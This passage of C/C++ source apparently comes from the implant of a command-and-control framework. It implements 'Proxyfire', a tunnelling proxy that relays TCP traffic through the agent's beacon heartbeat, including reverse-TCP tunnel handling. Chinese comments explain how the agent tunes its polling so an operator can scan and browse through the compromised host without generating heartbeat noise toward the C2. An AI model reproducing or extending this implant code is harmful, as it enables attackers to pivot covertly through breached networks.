			else {
				int max_reads = 16;
				while (max_reads-- > 0) {
					int readed = ApiWin->recv(tunnelData->sock, (char*)buffer, 0x10000, 0);

					if (readed > 0) {
						PackProxyData(packer, tunnelData->channelID, (PBYTE)buffer, readed);
						++count;
					}
					else if (readed == 0) {
						tunnelData->state = TUNNEL_STATE_CLOSE;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
						break;
					}
					else if (readed == -1) {
						int err = ApiWin->WSAGetLastError();
						if (err != WSAEWOULDBLOCK) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
						}
						break;
					}
					else {
						char peekBuf[1];
						int peekResult = ApiWin->recv(tunnelData->sock, peekBuf, 1, MSG_PEEK);
						if (peekResult == 0) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
						}
					}
				}
			}
		}
	}
	MemFreeLocal(&buffer, 0x10000);
	tunnelData = NULL;
	return count;
}

void Proxyfire_FlushProxy(Proxyfire* self, Packer* packer)
{
	TunnelData* tunnelData;

	timeval timeout;
	timeout.tv_sec = 0;
	timeout.tv_usec = 0;

	for (int i = 0; i < self->tunnels.size(); i++) {
		tunnelData = &(self->tunnels[i]);

		if (tunnelData->state != TUNNEL_STATE_READY)
			continue;

		if (tunnelData->writeBuffer == NULL || tunnelData->writeBufferSize == 0)
			continue;

		fd_set writefds;
		FD_ZERO(&writefds);
		FD_SET(tunnelData->sock, &writefds);

		int sel = ApiWin->select(0, NULL, &writefds, NULL, &timeout);
		if (sel <= 0 || !ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds))
			continue;

		int sent = ApiWin->send(tunnelData->sock, tunnelData->writeBuffer, (int)tunnelData->writeBufferSize, 0);
		if (sent > 0) {
			if ((ULONG)sent >= tunnelData->writeBufferSize) {
				MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
				tunnelData->writeBuffer = NULL;
				tunnelData->writeBufferSize = 0;
				if (packer && tunnelData->paused) {
					tunnelData->paused = FALSE;
					PackProxyControl(packer, tunnelData->channelID, COMMAND_TUNNEL_RESUME);
				}
			}
			else {
				ULONG remain = tunnelData->writeBufferSize - (ULONG)sent;

				CHAR* newBuf = (CHAR*)MemAllocLocal(remain);
				if (newBuf == NULL) {
					MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
					tunnelData->writeBuffer = NULL;
					tunnelData->writeBufferSize = 0;

					ApiWin->closesocket(tunnelData->sock);
					tunnelData->state = TUNNEL_STATE_CLOSE;

					if (packer)
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
					continue;
				}

				memcpy(newBuf, tunnelData->writeBuffer + sent, remain);
				MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);

				tunnelData->writeBuffer = newBuf;
				tunnelData->writeBufferSize = remain;
				if (packer && tunnelData->paused && tunnelData->writeBufferSize < TUNNEL_BUFFER_LOW_WATERMARK) {
					tunnelData->paused = FALSE;
					PackProxyControl(packer, tunnelData->channelID, COMMAND_TUNNEL_RESUME);
				}
			}
		}
		else if (sent == -1) {
			int err = ApiWin->WSAGetLastError();
			if (err != WSAEWOULDBLOCK) {
				if (tunnelData->writeBuffer) {
					MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
					tunnelData->writeBuffer = NULL;
					tunnelData->writeBufferSize = 0;
				}

				ApiWin->closesocket(tunnelData->sock);
				tunnelData->state = TUNNEL_STATE_CLOSE;

				if (packer)
					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_CLOSE, 0, err);
			}
		}
	}

	tunnelData = NULL;
}

void Proxyfire_CloseProxy(Proxyfire* self)
{
	TunnelData* tunnelData;
	for (int i = 0; i < self->tunnels.size(); i++) {
		tunnelData = &(self->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_CLOSE) {
			
			if (tunnelData->closeTimer == 0) {
				tunnelData->closeTimer = ApiWin->GetTickCount();
				continue;
			}

			if (tunnelData->closeTimer + 1000 < ApiWin->GetTickCount()) {
				if (tunnelData->mode == TUNNEL_MODE_SEND_TCP || tunnelData->mode == TUNNEL_MODE_SEND_UDP)
					ApiWin->shutdown(tunnelData->sock, 2);
				
				if (ApiWin->closesocket(tunnelData->sock) && tunnelData->mode == TUNNEL_MODE_REVERSE_TCP)
					continue;

				if (tunnelData->writeBuffer) {
					MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
					tunnelData->writeBuffer = NULL;
					tunnelData->writeBufferSize = 0;
				}

				self->tunnels.remove(i);
				--i;
				// 通道没了 = 这条客户端连接结束了。从**这一刻**起算待命窗口：
				// 紧跟着来的下一条连接（扫描器、浏览器的下一个请求）不该等一整个 sleep_delay。
				self->armedTick = ApiWin->GetTickCount();
			}
		}
	}
	tunnelData = NULL;
}

void Proxyfire_ProcessTunnels(Proxyfire* self, Packer* packer)
{
	if (!self->tunnels.size())
		return;

	// 这一轮往回包里塞了东西（目标端数据回来了 / 状态变化）⇒ 代理在流动。
	// 只认"隧道自己产出的增量"：进函数时 packer 里已经有命令输出，不能一进来就当成活跃。
	ULONG packerBefore = Packer_datasize(packer);

	Proxyfire_CheckProxy(self, packer);
	Proxyfire_FlushProxy(self, packer);

	ULONG finishTick = ApiWin->GetTickCount() + 2500;
	while ( Proxyfire_RecvProxy(self, packer) && ApiWin->GetTickCount() < finishTick );

	Proxyfire_CloseProxy(self);

	if (Packer_datasize(packer) > packerBefore)
		self->activeTick = ApiWin->GetTickCount();
}
Proxyfire* Proxyfire_Create()
{
	Proxyfire* self = (Proxyfire*)MemAllocLocal(sizeof(Proxyfire));
	new (&self->tunnels) Vector<TunnelData>();
	self->activeTick = 0;
	self->armedTick  = 0;
	self->resolverEvent   = NULL;
	self->resolverStarted = FALSE;
	self->resolverFailed  = FALSE;
	for (int i = 0; i < AX_DNS_CACHE_SIZE; i++) {
		self->dns[i].state = 0;      // 0 = 空槽；name/addr/tick 在复用前会被重填
		self->dns[i].name[0] = '\0';
		self->dns[i].addr = 0;
		self->dns[i].tick = 0;
	}
	return self;
}

/* MainAgent 的心跳循环用它决定这一轮睡多久（毫秒），返回 0 = 别管我，照常按 sleep_delay 睡。
 *
 * 隧道是搭心跳便车的，sleep_delay 就是代理的包间隔；有通道在就说明有人正在用这条代理，
 * 此时按毫秒级轮询，通道清空（Proxyfire_CloseProxy 关闭 1s 后 remove）即自动恢复原样。 */
ULONG Proxyfire_PollDelayMs(Proxyfire* self)
{
#if AX_TUNNEL_POLL_MS > 0
	if (!self)
		return 0;

	ULONG now = ApiWin->GetTickCount();

	if (self->tunnels.size() > 0) {
		// 有通道 ≠ 有人在用：浏览器挂在页面上不动、或工具连上就闲置时，通道还在但没有数据。
		// 这种时候退回慢一档的空闲节奏，免得对着 C2 空刷心跳（那是 sleep 0 级别的噪音）。
		if (self->activeTick != 0 && now - self->activeTick <= (ULONG)AX_TUNNEL_POLL_ACTIVE_MS)
			return (ULONG)AX_TUNNEL_POLL_MS;

#if AX_TUNNEL_POLL_IDLE_MS > 0
		return (ULONG)AX_TUNNEL_POLL_IDLE_MS;
#else
		return 0;
#endif
	}

#if AX_TUNNEL_ARMED_MS > 0
	// 没有通道，但刚用过代理（待命窗口内）：保持慢档。
	// 通道是跟着客户端连接走的 —— 关掉就没了。少了这一段，**下一条**连接要等 agent
	// 从 sleep_delay 的整睡里醒来（sleep=5 时实测 CONNECT 3.4~5s），扫描/连续点击全卡在这。
	if (self->armedTick != 0 && now - self->armedTick <= (ULONG)AX_TUNNEL_ARMED_MS)
		return (ULONG)AX_TUNNEL_POLL_IDLE_MS;
#endif

	return 0;
#else
	return 0;
#endif
}

void Proxyfire_Destroy(Proxyfire* self)
{
	if (!self)
		return;
	for (int i = 0; i < (int)self->tunnels.size(); i++) {
		TunnelData* t = &self->tunnels[i];
		if (t->writeBuffer)
			MemFreeLocal((LPVOID*)&t->writeBuffer, t->writeBufferSize);
		if (t->sock != INVALID_SOCKET)
			ApiWin->closesocket(t->sock);
	}
	self->tunnels.destroy();
	self->tunnels.~Vector<TunnelData>();
	MemFreeLocal((LPVOID*)&self, sizeof(Proxyfire));
}
